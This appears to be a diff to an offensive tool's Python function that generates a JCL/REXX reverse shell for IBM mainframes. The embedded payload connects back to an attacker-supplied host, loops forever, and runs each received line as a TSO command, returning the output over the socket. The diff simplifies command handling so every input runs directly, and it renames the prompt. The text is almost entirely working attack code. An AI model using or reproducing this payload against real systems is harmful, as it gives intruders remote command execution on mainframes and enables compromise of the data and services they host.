@@ -708,7 +708,7 @@ def reverse_jcl(lhost, username="CICSUSEB"):
        par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
     t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
     t=SOCKET('SOCKETSETSTATUS','CLIENT');
-    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'Shell> ')
+    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'TSO> ')
   DO FOREVER
     g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;return 0
  get_cmd:
@@ -725,11 +725,8 @@ def reverse_jcl(lhost, username="CICSUSEB"):
    u = OUTTRAP(OFF);DO i = 1 to tso_out.0
       text = text||tso_out.i||nl;end;return text
  exec_cmd:
- parse arg sockID, do_it; parse var do_it do_it do_co
- SELECT
-  WHEN translate(do_it) = 'TSO' THEN do
-   t=SOCKET('SEND',sockID, exec_tso(do_co)||nl);end
- te = SOCKET('SEND',sockID, 'Shell> ');return 1;
+ parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
+ te = SOCKET('SEND',sockID, 'Tso> ');return 1;
 /*
 //SYSOUT     DD SYSOUT=*
 //STEP01 EXEC  PGM=IKJEFT01
